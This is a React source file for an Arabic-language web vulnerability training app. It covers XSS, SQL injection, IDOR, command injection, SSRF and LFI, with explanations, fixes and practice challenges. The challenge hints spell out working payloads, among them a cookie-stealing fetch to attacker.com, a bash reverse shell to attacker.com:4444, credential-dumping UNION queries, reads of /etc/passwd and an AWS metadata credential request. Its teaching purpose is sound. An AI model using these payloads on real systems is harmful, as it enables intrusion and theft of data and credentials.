import { useState } from "react";

const VULNS = [
  {
    id: "xss",
    name: "XSS - Cross-Site Scripting",
    icon: "⚡",
    color: "#ff79c6",
    description: "حقن كود JavaScript في صفحات الويب لسرقة بيانات المستخدمين",
    what: "XSS بتخلي المهاجم يحقن JavaScript في الموقع، فلما أي مستخدم يفتح الصفحة يتنفذ الكود على متصفحه!",
    types: [
      { name: "Reflected XSS", desc: "الـ payload في الـ URL ويرجع مباشرة في الـ response" },
      { name: "Stored XSS", desc: "الـ payload يتحفظ في الـ database ويظهر لكل الزوار — الأخطر!" },
      { name: "DOM-based XSS", desc: "الـ payload يشتغل في JavaScript على المتصفح مباشرة" },
    ],
    impact: "سرقة الـ Cookies / Session hijacking / Keylogging / Redirect لمواقع مزيفة",
    fix: "HTML Encoding للـ output + Content-Security-Policy + HttpOnly Cookies",
    challenges: [
      {
        id: 1,
        title: "🟢 تحدي 1: Basic XSS",
        desc: 'الموقع بيعرض اسمك كما هو. حاول تحقن XSS في حقل الاسم:',
        hint: 'جرب: <script>alert("XSS")</script>',
        mockHtml: (input) => {
          const safe = input.replace(/</g,'&lt;').replace(/>/g,'&gt;');
          const unsafe = input;
          return { safe, unsafe, vuln: true };
        },
        check: (inp) => inp.includes('<script') || inp.includes('onerror') || inp.includes('onload') || inp.includes('alert'),
        successMsg: "🎯 XSS نجح! الموقع ما فلتر الـ input — الكود شتغل!",
      },
      {
        id: 2,
        title: "🟡 تحدي 2: Filter Bypass",
        desc: 'الموقع ده بيحذف كلمة "script". حاول تتجاوز الفلتر:',
        hint: 'جرب: <img src=x onerror=alert(1)> أو <svg onload=alert(1)>',
        check: (inp) => (inp.includes('onerror') || inp.includes('onload') || inp.includes('onfocus')) && !inp.toLowerCase().includes('<script'),
        successMsg: "🎯 Filter Bypass نجح! مش لازم script tag — كتير tags تانية بتشتغل!",
      },
      {
        id: 3,
        title: "🔴 تحدي 3: Cookie Stealer",
        desc: 'اكتب payload بيسرق الـ Cookies ويبعتها لـ attacker.com:',
        hint: "جرب: <script>fetch('http://attacker.com/?c='+document.cookie)</script>",
        check: (inp) => inp.includes('cookie') && (inp.includes('fetch') || inp.includes('location') || inp.includes('XMLHttpRequest')),
        successMsg: "🎯 Cookie Stealer! هذا بالظبط كيف المهاجمين يسرقون الـ Sessions!",
      },
    ],
  },
  {
    id: "sqli",
    name: "SQL Injection",
    icon: "💉",
    color: "#ff5555",
    description: "حقن أوامر SQL في قواعد البيانات للحصول على بيانات أو تجاوز المصادقة",
    what: "SQL Injection بتحصل لما الـ input بتاع المستخدم بيتحط مباشرة في الـ SQL query بدون تنقية. المهاجم يقدر يغير الـ query ويوصل لأي بيانات!",
    types: [
      { name: "Classic SQLi", desc: "نتيجة الـ query بتظهر مباشرة في الصفحة" },
      { name: "Blind SQLi", desc: "مش بتشوف نتيجة مباشرة بس بتعرف True/False" },
      { name: "Time-based SQLi", desc: "بتستخدم SLEEP() لتأخير الـ response لمعرفة النتيجة" },
      { name: "UNION-based SQLi", desc: "بتستخدم UNION لاستخراج بيانات من جداول تانية" },
    ],
    impact: "سرقة كل بيانات قاعدة البيانات / تجاوز Login / حذف أو تعديل البيانات / RCE أحياناً",
    fix: "Prepared Statements / Parameterized Queries / Input Validation / WAF",
    challenges: [
      {
        id: 1,
        title: "🟢 تحدي 1: Login Bypass",
        desc: "هذا الـ Login بيستخدم SQL مباشرة. حاول تدخل بدون باسورد:",
        hint: "جرب في الـ username: admin'-- أو ' OR '1'='1",
        check: (inp) => inp.includes("'") && (inp.includes('--') || inp.includes('OR') || inp.includes('or') || inp.includes('1=1')),
        successMsg: "🎯 Login Bypass! الـ Query صارت: SELECT * FROM users WHERE username='admin'--' AND password='' — الباسورد اتجاهل!",
      },
      {
        id: 2,
        title: "🟡 تحدي 2: UNION Attack",
        desc: "استخرج أسماء الجداول من قاعدة البيانات:",
        hint: "جرب: ' UNION SELECT table_name FROM information_schema.tables--",
        check: (inp) => inp.toLowerCase().includes('union') && inp.toLowerCase().includes('select'),
        successMsg: "🎯 UNION Injection! قدرت تجمع الـ query مع query تانية وتسرق بيانات!",
      },
      {
        id: 3,
        title: "🔴 تحدي 3: Data Extraction",
        desc: "استخرج الـ usernames والـ passwords من جدول users:",
        hint: "جرب: ' UNION SELECT username,password FROM users--",
        check: (inp) => inp.toLowerCase().includes('union') && inp.toLowerCase().includes('password') && inp.toLowerCase().includes('users'),
        successMsg: "🎯 Data Dump! استخرجت كل الـ credentials من قاعدة البيانات!",
      },
    ],
  },
  {
    id: "idor",
    name: "IDOR - Broken Access Control",
    icon: "🔓",
    color: "#ffb86c",
    description: "الوصول لبيانات مستخدمين آخرين بتغيير الـ ID في الـ URL",
    what: "IDOR بيحصل لما الموقع يعتمد على ID في الـ URL للتحقق من الصلاحيات بدون التحقق إنك فعلاً صاحب هذه البيانات!",
    types: [
      { name: "URL-based IDOR", desc: "تغيير الـ ID في الـ URL: /user/1 → /user/2" },
      { name: "JSON/POST IDOR", desc: "تغيير الـ ID في بيانات الـ POST request" },
      { name: "Cookie-based IDOR", desc: "تغيير قيمة في الـ Cookie" },
    ],
    impact: "قراءة / تعديل / حذف بيانات أي مستخدم في النظام!",
    fix: "التحقق من صلاحيات المستخدم على الـ server side لكل طلب",
    challenges: [
      {
        id: 1,
        title: "🟢 تحدي 1: Profile IDOR",
        desc: "أنت user رقم 42. حاول تشوف بيانات user آخر:",
        hint: "غير الـ user ID في الـ URL: /api/users/42 → /api/users/1",
        check: (inp) => {
          const num = parseInt(inp);
          return !isNaN(num) && num !== 42 && num > 0;
        },
        successMsg: "🎯 IDOR! وصلت لبيانات user تاني بس بتغيير الـ ID!",
      },
      {
        id: 2,
        title: "🟡 تحدي 2: Admin Panel",
        desc: "الـ API بيرجع /api/orders/{id}. أنت order 1001. ابحث عن orders تانية:",
        hint: "جرب IDs مختلفة زي 1, 100, 999, 1000",
        check: (inp) => {
          const num = parseInt(inp);
          return !isNaN(num) && num !== 1001;
        },
        successMsg: "🎯 Order IDOR! قدرت تشوف orders ناس تانية وممكن تعرف تفاصيل مشترياتهم!",
      },
      {
        id: 3,
        title: "🔴 تحدي 3: Delete Any Account",
        desc: "الـ API: DELETE /api/users/{id}. حسابك ID=42. احذف حساب الـ admin (ID=1):",
        hint: "ابعت: DELETE /api/users/1",
        check: (inp) => inp.trim() === '1' || inp.includes('/1') || inp.includes('users/1'),
        successMsg: "🎯 Critical IDOR! قدرت تحذف حساب الـ admin! هذا Critical vulnerability!",
      },
    ],
  },
  {
    id: "cmdi",
    name: "Command Injection",
    icon: "💻",
    color: "#50fa7b",
    description: "حقن أوامر نظام التشغيل في تطبيق الويب",
    what: "Command Injection بتحصل لما الـ server بيستخدم input المستخدم مباشرة في أمر shell. المهاجم يقدر ينفذ أي أمر على الـ server!",
    types: [
      { name: "Classic CMDi", desc: "النتيجة بترجع مباشرة في الـ response" },
      { name: "Blind CMDi", desc: "ما بتشوف النتيجة بس الأمر بيتنفذ" },
      { name: "Out-of-band CMDi", desc: "النتيجة بتيجي لسيرفر تاني" },
    ],
    impact: "تنفيذ أي أمر على الـ server / قراءة أي ملف / RCE كامل / سرقة الـ server",
    fix: "عدم استخدام input المستخدم في system calls / استخدام APIs بدل shell / Input validation",
    challenges: [
      {
        id: 1,
        title: "🟢 تحدي 1: Basic Command Injection",
        desc: 'الموقع بيعمل ping على الـ IP اللي تكتبه. الكود: system("ping " + input)',
        hint: "جرب: 127.0.0.1; whoami  أو  127.0.0.1 && id",
        check: (inp) => inp.includes(';') || inp.includes('&&') || inp.includes('||') || inp.includes('|'),
        successMsg: "🎯 Command Injection! الـ server نفّذ أمرك! الـ ; بيفصل بين الأوامر!",
      },
      {
        id: 2,
        title: "🟡 تحدي 2: Read System Files",
        desc: 'اقرأ ملف /etc/passwd من الـ server:',
        hint: "جرب: 127.0.0.1; cat /etc/passwd",
        check: (inp) => inp.includes('cat') && inp.includes('passwd') || inp.includes('cat /etc'),
        successMsg: "🎯 File Read! قرأت /etc/passwd — فيه كل users الـ server!",
      },
      {
        id: 3,
        title: "🔴 تحدي 3: Reverse Shell",
        desc: 'افتح Reverse Shell للـ attacker.com على port 4444:',
        hint: "جرب: ; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        check: (inp) => (inp.includes('/dev/tcp') || inp.includes('nc ') || inp.includes('netcat') || inp.includes('bash -i')) && (inp.includes(';') || inp.includes('&&')),
        successMsg: "🎯 Reverse Shell! حصلت على shell كامل على الـ server — هذا RCE!",
      },
    ],
  },
  {
    id: "ssrf",
    name: "SSRF - Server Side Request Forgery",
    icon: "🌐",
    color: "#8be9fd",
    description: "إجبار الـ server على عمل requests لأماكن داخلية",
    what: "SSRF بتخلي المهاجم يستخدم الـ server كـ proxy للوصول لخدمات داخلية مش متاحة للخارج مباشرة!",
    types: [
      { name: "Basic SSRF", desc: "الـ response بيرجع في الصفحة مباشرة" },
      { name: "Blind SSRF", desc: "ما بتشوف الـ response بس الـ request بيحصل" },
      { name: "SSRF to RCE", desc: "عن طريق خدمات داخلية زي Redis أو Memcached" },
    ],
    impact: "الوصول لـ internal network / قراءة AWS metadata / Bypass Firewall / Port Scanning",
    fix: "Whitelist للـ URLs المسموحة / حظر IPs الداخلية / استخدام DNS rebinding protection",
    challenges: [
      {
        id: 1,
        title: "🟢 تحدي 1: Internal Service Access",
        desc: 'الموقع عنده feature: "fetch URL". حاول توصل للـ admin panel الداخلي:',
        hint: "جرب: http://localhost/admin  أو  http://127.0.0.1:8080/admin",
        check: (inp) => inp.includes('localhost') || inp.includes('127.0.0.1') || inp.includes('0.0.0.0'),
        successMsg: "🎯 SSRF! الـ server جاب الـ admin panel الداخلي نيابة عنك!",
      },
      {
        id: 2,
        title: "🟡 تحدي 2: AWS Metadata",
        desc: "الموقع على AWS. اسرق الـ credentials من metadata endpoint:",
        hint: "جرب: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        check: (inp) => inp.includes('169.254.169.254') || inp.includes('metadata'),
        successMsg: "🎯 AWS Metadata SSRF! سرقت الـ IAM credentials — تقدر تتحكم في الـ AWS account!",
      },
      {
        id: 3,
        title: "🔴 تحدي 3: Filter Bypass",
        desc: "الموقع بيحظر 127.0.0.1 و localhost. تجاوز الفلتر:",
        hint: "جرب: http://0x7f000001/  أو  http://2130706433/  أو  http://127.1/",
        check: (inp) => inp.includes('0x7f') || inp.includes('2130706433') || inp.includes('127.1') || inp.includes('@127') || inp.includes('::1'),
        successMsg: "🎯 Filter Bypass! نفس الـ IP بس بصيغة مختلفة — الفلتر انخدع!",
      },
    ],
  },
  {
    id: "lfi",
    name: "LFI - Local File Inclusion",
    icon: "📁",
    color: "#bd93f9",
    description: "قراءة ملفات النظام عن طريق ثغرة في include الملفات",
    what: "LFI بتحصل لما الـ server بيعمل include لملف بناءً على input المستخدم. المهاجم يقدر يقرأ أي ملف على الـ server!",
    types: [
      { name: "Basic LFI", desc: "قراءة ملفات بـ ../../../ للـ directory traversal" },
      { name: "LFI to RCE", desc: "تشغيل كود عن طريق log poisoning أو PHP wrappers" },
      { name: "RFI", desc: "Remote File Inclusion - تضمين ملف من سيرفر خارجي" },
    ],
    impact: "قراءة /etc/passwd / قراءة source code / قراءة config files / RCE في حالات متقدمة",
    fix: "عدم استخدام input المستخدم في file paths / Whitelist للملفات المسموحة / Disable allow_url_include",
    challenges: [
      {
        id: 1,
        title: "🟢 تحدي 1: Basic LFI",
        desc: 'URL: /page?file=about.php  — حاول تقرأ /etc/passwd:',
        hint: "جرب: ../../../etc/passwd",
        check: (inp) => inp.includes('../') && inp.includes('etc'),
        successMsg: "🎯 LFI! قرأت /etc/passwd — فيه كل users الـ server!",
      },
      {
        id: 2,
        title: "🟡 تحدي 2: Read Config File",
        desc: 'اقرأ ملف config.php الموجود في /var/www/html/:',
        hint: "جرب: ../../../../var/www/html/config.php أو php://filter/read=convert.base64-encode/resource=config.php",
        check: (inp) => (inp.includes('config') && inp.includes('../')) || inp.includes('php://filter'),
        successMsg: "🎯 Config File Read! حصلت على الـ database credentials من config.php!",
      },
      {
        id: 3,
        title: "🔴 تحدي 3: Log Poisoning → RCE",
        desc: "اقرأ ملف الـ Apache access log:",
        hint: "جرب: ../../../var/log/apache2/access.log  ثم inject PHP في الـ User-Agent",
        check: (inp) => inp.includes('log') || inp.includes('proc/self'),
        successMsg: "🎯 Log Poisoning! لو تكتب PHP في الـ User-Agent وبعدين تضمن الـ log — RCE!",
      },
    ],
  },
];

export default function WebVulnTrainer() {
  const [activeVuln, setActiveVuln] = useState(null);
  const [activeChallenge, setActiveChallenge] = useState(null);
  const [input, setInput] = useState("");
  const [result, setResult] = useState(null);
  const [solved, setSolved] = useState({});
  const [tab, setTab] = useState("learn");

  const totalChallenges = VULNS.reduce((s, v) => s + v.challenges.length, 0);
  const totalSolved = Object.keys(solved).length;

  function tryChallenge() {
    if (!activeChallenge || !input.trim()) return;
    const success = activeChallenge.check(input);
    setResult({ success, msg: success ? activeChallenge.successMsg : "❌ لسه مش صح — اقرأ الـ hint وجرب تاني!" });
    if (success) {
      setSolved(prev => ({ ...prev, [`${activeVuln.id}-${activeChallenge.id}`]: true }));
    }
  }

  const C = {
    bg: "#0d1117", card: "#161b22", border: "#21262d",
    text: "#e6edf3", text2: "#8b949e", green: "#3fb950",
  };

  if (!activeVuln) return (
    <div style={{ background: C.bg, minHeight: "100vh", padding: 20, fontFamily: "monospace", direction: "rtl" }}>
      <div style={{ maxWidth: 1000, margin: "0 auto" }}>
        <div style={{ textAlign: "center", marginBottom: 30 }}>
          <div style={{ fontSize: 32, fontWeight: 900, color: "#ff79c6", marginBottom: 8 }}>🎯 مدرب ثغرات الويب</div>
          <div style={{ color: C.text2, fontSize: 14 }}>تعلم وطبق على {VULNS.length} ثغرات حقيقية — من الصفر للاحتراف</div>
          <div style={{ marginTop: 12, padding: "8px 20px", background: "#21262d", borderRadius: 20, display: "inline-block", color: C.green, fontSize: 13 }}>
            ✅ {totalSolved} / {totalChallenges} تحديات محلولة
          </div>
        </div>

        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(280px, 1fr))", gap: 16 }}>
          {VULNS.map(v => {
            const vSolved = v.challenges.filter(c => solved[`${v.id}-${c.id}`]).length;
            return (
              <div key={v.id} onClick={() => { setActiveVuln(v); setActiveChallenge(null); setInput(""); setResult(null); setTab("learn"); }}
                style={{ background: C.card, border: `1px solid ${v.color}33`, borderRadius: 12, padding: 20, cursor: "pointer", transition: "all 0.2s" }}
                onMouseEnter={e => e.currentTarget.style.borderColor = v.color}
                onMouseLeave={e => e.currentTarget.style.borderColor = v.color + "33"}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 10 }}>
                  <span style={{ fontSize: 28 }}>{v.icon}</span>
                  <span style={{ background: v.color + "22", color: v.color, padding: "2px 10px", borderRadius: 20, fontSize: 12 }}>
                    {vSolved}/{v.challenges.length} ✅
                  </span>
                </div>
                <div style={{ fontWeight: 700, color: v.color, fontSize: 15, marginBottom: 6 }}>{v.name}</div>
                <div style={{ color: C.text2, fontSize: 12, lineHeight: 1.6 }}>{v.description}</div>
                <div style={{ marginTop: 12, height: 4, background: "#21262d", borderRadius: 4 }}>
                  <div style={{ width: `${(vSolved / v.challenges.length) * 100}%`, height: "100%", background: v.color, borderRadius: 4, transition: "width 0.3s" }} />
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );

  return (
    <div style={{ background: C.bg, minHeight: "100vh", padding: 20, fontFamily: "monospace", direction: "rtl" }}>
      <div style={{ maxWidth: 900, margin: "0 auto" }}>

        {/* Header */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
          <button onClick={() => setActiveVuln(null)} style={{ background: "#21262d", border: "none", color: C.text2, padding: "6px 14px", borderRadius: 8, cursor: "pointer", fontSize: 13 }}>
            ← رجوع
          </button>
          <div style={{ fontSize: 20, fontWeight: 700, color: activeVuln.color }}>{activeVuln.icon} {activeVuln.name}</div>
          <div style={{ width: 60 }} />
        </div>

        {/* Tabs */}
        <div style={{ display: "flex", gap: 8, marginBottom: 20 }}>
          {["learn", "challenges"].map(t => (
            <button key={t} onClick={() => setTab(t)} style={{ padding: "8px 20px", borderRadius: 8, border: `1px solid ${tab === t ? activeVuln.color : C.border}`, background: tab === t ? activeVuln.color + "22" : "transparent", color: tab === t ? activeVuln.color : C.text2, cursor: "pointer", fontFamily: "monospace", fontSize: 13, fontWeight: 700 }}>
              {t === "learn" ? "📖 تعلم" : "🎯 تحديات"}
            </button>
          ))}
        </div>

        {tab === "learn" && (
          <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
            {/* What */}
            <div style={{ background: C.card, border: `1px solid ${activeVuln.color}33`, borderRadius: 12, padding: 20 }}>
              <div style={{ color: activeVuln.color, fontWeight: 700, fontSize: 15, marginBottom: 10 }}>🤔 إيه هي الثغرة دي؟</div>
              <div style={{ color: C.text, lineHeight: 1.8, fontSize: 14 }}>{activeVuln.what}</div>
            </div>

            {/* Types */}
            <div style={{ background: C.card, border: `1px solid ${C.border}`, borderRadius: 12, padding: 20 }}>
              <div style={{ color: "#f1fa8c", fontWeight: 700, fontSize: 15, marginBottom: 12 }}>📋 أنواعها</div>
              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
                {activeVuln.types.map((t, i) => (
                  <div key={i} style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
                    <span style={{ color: activeVuln.color, fontWeight: 700, whiteSpace: "nowrap", minWidth: 160 }}>{t.name}</span>
                    <span style={{ color: C.text2, fontSize: 13, lineHeight: 1.6 }}>{t.desc}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Impact */}
            <div style={{ background: "#ff555511", border: "1px solid #ff555533", borderRadius: 12, padding: 20 }}>
              <div style={{ color: "#ff5555", fontWeight: 700, fontSize: 15, marginBottom: 8 }}>💥 التأثير</div>
              <div style={{ color: "#ff8080", fontSize: 13, lineHeight: 1.8 }}>{activeVuln.impact}</div>
            </div>

            {/* Fix */}
            <div style={{ background: "#50fa7b11", border: "1px solid #50fa7b33", borderRadius: 12, padding: 20 }}>
              <div style={{ color: "#50fa7b", fontWeight: 700, fontSize: 15, marginBottom: 8 }}>🛡️ الحماية والإصلاح</div>
              <div style={{ color: "#80ffaa", fontSize: 13, lineHeight: 1.8 }}>{activeVuln.fix}</div>
            </div>

            <button onClick={() => setTab("challenges")} style={{ background: activeVuln.color, border: "none", color: "#000", padding: "12px 24px", borderRadius: 10, cursor: "pointer", fontFamily: "monospace", fontSize: 14, fontWeight: 700 }}>
              🎯 ابدأ التحديات العملية ←
            </button>
          </div>
        )}

        {tab === "challenges" && (
          <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
            {/* Challenge list */}
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              {activeVuln.challenges.map(c => {
                const isSolved = solved[`${activeVuln.id}-${c.id}`];
                const isActive = activeChallenge?.id === c.id;
                return (
                  <button key={c.id} onClick={() => { setActiveChallenge(c); setInput(""); setResult(null); }}
                    style={{ padding: "8px 16px", borderRadius: 8, border: `1px solid ${isActive ? activeVuln.color : isSolved ? "#50fa7b" : C.border}`, background: isActive ? activeVuln.color + "22" : isSolved ? "#50fa7b11" : "transparent", color: isActive ? activeVuln.color : isSolved ? "#50fa7b" : C.text2, cursor: "pointer", fontFamily: "monospace", fontSize: 12, fontWeight: 700 }}>
                    {isSolved ? "✅" : "🎯"} تحدي {c.id}
                  </button>
                );
              })}
            </div>

            {activeChallenge && (
              <div style={{ background: C.card, border: `1px solid ${activeVuln.color}44`, borderRadius: 12, padding: 20 }}>
                <div style={{ color: activeVuln.color, fontWeight: 700, fontSize: 15, marginBottom: 12 }}>{activeChallenge.title}</div>
                <div style={{ color: C.text, marginBottom: 16, lineHeight: 1.8, fontSize: 14 }}>{activeChallenge.desc}</div>

                {/* Hint */}
                <div style={{ background: "#ffb86c11", border: "1px solid #ffb86c33", borderRadius: 8, padding: "10px 14px", marginBottom: 16, fontSize: 13, color: "#ffb86c" }}>
                  💡 تلميح: {activeChallenge.hint}
                </div>

                {/* Input */}
                <div style={{ marginBottom: 12 }}>
                  <div style={{ color: C.text2, fontSize: 12, marginBottom: 6 }}>✏️ أدخل الـ payload:</div>
                  <textarea
                    value={input}
                    onChange={e => { setInput(e.target.value); setResult(null); }}
                    placeholder="اكتب الـ payload هنا..."
                    rows={3}
                    style={{ width: "100%", background: "#0d1117", border: `1px solid ${C.border}`, borderRadius: 8, padding: "10px 14px", color: "#50fa7b", fontFamily: "monospace", fontSize: 13, resize: "vertical", outline: "none", boxSizing: "border-box", direction: "ltr", textAlign: "left" }}
                    onKeyDown={e => e.key === "Enter" && e.ctrlKey && tryChallenge()}
                  />
                </div>

                <button onClick={tryChallenge} style={{ background: activeVuln.color, border: "none", color: "#000", padding: "10px 24px", borderRadius: 8, cursor: "pointer", fontFamily: "monospace", fontSize: 14, fontWeight: 700 }}>
                  🚀 جرب الـ Payload (Ctrl+Enter)
                </button>

                {result && (
                  <div style={{ marginTop: 16, padding: "14px 18px", background: result.success ? "#50fa7b11" : "#ff555511", border: `1px solid ${result.success ? "#50fa7b44" : "#ff555544"}`, borderRadius: 10, color: result.success ? "#50fa7b" : "#ff8080", fontSize: 14, lineHeight: 1.8 }}>
                    {result.msg}
                    {result.success && (
                      <div style={{ marginTop: 10, color: C.text2, fontSize: 12 }}>
                        🎓 الدرس: الـ input وصل للـ server بدون تنقية. في الواقع كان هيتنفذ!
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}

            {!activeChallenge && (
              <div style={{ textAlign: "center", color: C.text2, padding: 40, fontSize: 14 }}>
                👆 اختار تحدي من فوق عشان تبدأ
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
